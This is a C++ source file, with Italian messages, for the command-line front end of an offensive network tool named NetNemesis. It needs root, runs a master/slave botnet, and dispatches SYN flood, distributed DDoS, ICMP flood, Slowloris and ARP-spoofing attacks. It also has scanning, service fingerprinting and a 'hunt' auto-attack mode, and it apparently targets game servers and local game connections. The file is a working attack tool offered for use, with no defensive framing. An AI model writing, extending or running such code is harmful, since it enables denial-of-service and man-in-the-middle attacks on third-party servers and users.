#include "netnemesis.h"
#include <sstream>

std::atomic<bool> g_running(true);
std::atomic<bool> g_is_master(false);
std::atomic<bool> g_is_slave(false);
std::atomic<bool> g_auto_hunt(false);
std::mutex g_print_mutex;

bool checkRoot() {
    if (getuid() != 0) {
        std::cerr << "\033[31m[ERRORE] NetNemesis richiede privilegi root!\033[0m" << std::endl;
        std::cerr << "Esegui con: sudo ./netnemesis" << std::endl;
        return false;
    }
    return true;
}

NetNemesisCLI::NetNemesisCLI() : attack_engine(&botnet) {}

void NetNemesisCLI::showBanner() {
    const char* banners[] = {
        R"(
    _   __      __   _  __                __
   / | / /___  / /__| |/ /___  __  ______/ /
  /  |/ / __ \/ / _ \   / __ \/ / / / __  / 
 / /|  / /_/ / /  __/   / /_/ / /_/ / /_/ /  
/_/ |_/\____/_/\___/_/|_\____/\__,_/\__,_/   
    [ Packet Crafting Edition - Linux Only ]
)",
        R"(
    ███╗   ██╗███████╗████████╗███╗   ██╗███████╗███╗   ███╗███████╗███████╗██╗███████╗
    ████╗  ██║██╔════╝╚══██╔══╝████╗  ██║██╔════╝████╗ ████║██╔════╝██╔════╝██║██╔════╝
    ██╔██╗ ██║█████╗     ██║   ██╔██╗ ██║█████╗  ██╔████╔██║█████╗  ███████╗██║███████╗
    ██║╚██╗██║██╔══╝     ██║   ██║╚██╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  ╚════██║██║╚════██║
    ██║ ╚████║███████╗   ██║   ██║ ╚████║███████╗██║ ╚═╝ ██║███████╗███████║██║███████║
    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝╚══════╝
                                    [ ROOT REQUIRED ]
)",
    };
    srand(time(NULL));
    std::cout << "\033[35m" << banners[rand() % 2] << "\033[0m" << std::endl;
    std::cout << "\033[33m    Versione 3.0 - Type 'help' for commands\033[0m\n" << std::endl;
}

void NetNemesisCLI::botnetInteractiveMenu() {
    std::cout << "\n\033[36m╔════════════════════════════════╗\n";
    std::cout << "║     BOTNET CONFIGURATION       ║\n";
    std::cout << "╠════════════════════════════════╣\n";
    std::cout << "║  1. MASTER - Diventa master    ║\n";
    std::cout << "║  2. SLAVE  - Connettiti a master║\n";
    std::cout << "║  3. BACK   - Torna al menu     ║\n";
    std::cout << "╚════════════════════════════════╝\033[0m\n";
    std::cout << "Scelta: ";
    
    int scelta;
    std::cin >> scelta;
    std::cin.ignore();
    
    if (scelta == 1) {
        std::cout << "Inserisci porta per il MASTER [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startMaster(port);
    } else if (scelta == 2) {
        std::cout << "Inserisci IP del MASTER: ";
        std::string ip;
        std::getline(std::cin, ip);
        std::cout << "Inserisci porta del MASTER [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startSlave(ip, port);
    }
}

void NetNemesisCLI::run() {
    Utils::clearScreen();
    showBanner();
    
    std::string input;
    while (g_running) {
        std::cout << "\033[32mroot@NetNemesis\033[0m";
        if (g_is_master) std::cout << "\033[31m[MASTER]\033[0m";
        if (g_is_slave) std::cout << "\033[33m[SLAVE]\033[0m";
        if (g_auto_hunt) std::cout << "\033[35m[HUNT]\033[0m";
        std::cout << ":# ";
        
        std::getline(std::cin, input);
        if (input.empty()) continue;
        
        auto args = Utils::split(input, ' ');
        std::string cmd = args[0];
        
        if (cmd == "clear") {
            Utils::clearScreen();
            showBanner();
        }
        else if (cmd == "botnet") {
            botnetInteractiveMenu();
        }
        else if (cmd == "dos" && args.size() >= 3) {
            attack_engine.executeDOS(args[1], std::stoi(args[2]), true);
        }
        else if (cmd == "ddos" && args.size() >= 3) {
            int bots = (args.size() > 3) ? std::stoi(args[3]) : 10;
            attack_engine.executeDDOS(args[1], std::stoi(args[2]), bots);
        }
        else if (cmd == "scan") {
            scanner.start();
        }
        else if (cmd == "scan_stop") {
            scanner.stop();
            Utils::logInfo("Scanner fermato - Ritorno al menu principale");
        }
        else if (cmd == "hunt") {
            g_auto_hunt = !g_auto_hunt;
            Utils::logWarning(g_auto_hunt ? "HUNT MODE: ON" : "HUNT MODE: OFF");
            if (g_auto_hunt) scanner.start();
        }
        else if (cmd == "servers") {
            auto servers = scanner.getServers();
            Utils::logInfo("Server trovati: " + std::to_string(servers.size()));
            for (const auto &s : servers) {
                std::cout << "  - " << s.first << ":" << s.second << std::endl;
            }
        }
        else if (cmd == "connections") {
            auto conns = scanner.getConnections();
            Utils::logInfo("Connessioni di gioco locali: " + std::to_string(conns.size()));
            for (const auto &c : conns) {
                std::cout << "  - " << c.first << ":" << c.second << " (" << getGameName(c.second) << ")" << std::endl;
            }
        }
        else if (cmd == "exit" || cmd == "quit") {
            g_running = false;
            botnet.stop();
            scanner.stop();
            Utils::logInfo("Arrivederci!");
        }
        else if (cmd == "fingerprint" && args.size() >= 3) {
            ServiceFingerprinter fp;
            auto info = fp.fingerprint(args[1], std::stoi(args[2]));
            Utils::logSuccess("Servizio rilevato:");
            std::cout << "  Nome: " << info.name << std::endl;
            std::cout << "  Versione: " << info.version << std::endl;
            std::cout << "  Info: " << info.extra_info << std::endl;
        }
        else if (cmd == "icmp" && args.size() >= 2) {
            int packets = (args.size() > 2) ? std::stoi(args[2]) : 10000;
            attack_engine.executeICMPFlood(args[1], packets);
        }
        else if (cmd == "slowloris" && args.size() >= 3) {
            int conn = (args.size() > 3) ? std::stoi(args[3]) : 1000;
            attack_engine.executeSlowloris(args[1], std::stoi(args[2]), conn);
        }
        else if (cmd == "arp" && args.size() >= 3) {
            attack_engine.executeARPSpoof(args[1], args[2]);
        }
        else if (cmd == "stop_slowloris") {
            Utils::logInfo("Fermando Slowloris...");
            attack_engine.stopSlowloris();
        }
        else if (cmd == "help") {
            std::cout << "\033[36m╔══════════════════════════════════════════════════════════════╗\n"
                         "║                    COMANDI DISPONIBILI                       ║\n"
                         "╠══════════════════════════════════════════════════════════════╣\n"
                         "║  \033[33mATTACCHI BASE\033[36m                                              ║\n"
                         "║  dos <ip> <port>              - SYN Flood                    ║\n"
                         "║  ddos <ip> <port> [n]         - Distributed SYN Flood        ║\n"
                         "║  icmp <ip> [packets]          - ICMP Echo Flood              ║\n"
                         "║  slowloris <ip> <port> [n]    - HTTP Slowloris attack        ║\n"
                         "║  arp <target> <gateway>       - ARP Spoofing MITM          ║\n"
                         "║                                                              ║\n"
                         "║  \033[33mRICONNAISSANCE\033[36m                                             ║\n"
                         "║  fingerprint <ip> <port>      - Service fingerprinting     ║\n"
                         "║  scan                         - Network scanner              ║\n"
                         "║  scan_stop                    - Ferma scanner              ║\n"
                         "║  servers                      - Lista server trovati       ║\n"
                         "║  connections                  - Connessioni di gioco locali ║\n"
                         "║                                                              ║\n"
                         "║  \033[33mBOTNET\033[36m                                                     ║\n"
                         "║  botnet                       - Menu configurazione          ║\n"
                         "║  hunt                         - Auto-attack mode             ║\n"
                         "║                                                              ║\n"
                         "║  \033[33mCONTROLLO\033[36m                                                 ║\n"
                         "║  clear                        - Pulisci schermo              ║\n"
                         "║  stop_slowloris               - Ferma Slowloris              ║\n"
                         "║  exit                         - Esci                         ║\n"
                         "╚══════════════════════════════════════════════════════════════╝\033[0m" << std::endl;
        }
        else {
            Utils::logError("Comando sconosciuto: " + cmd);
        }
    }
}

int main() {
    if (!checkRoot()) {
        return 1;
    }
    
    NetNemesisCLI cli;
    cli.run();
    
    return 0;
}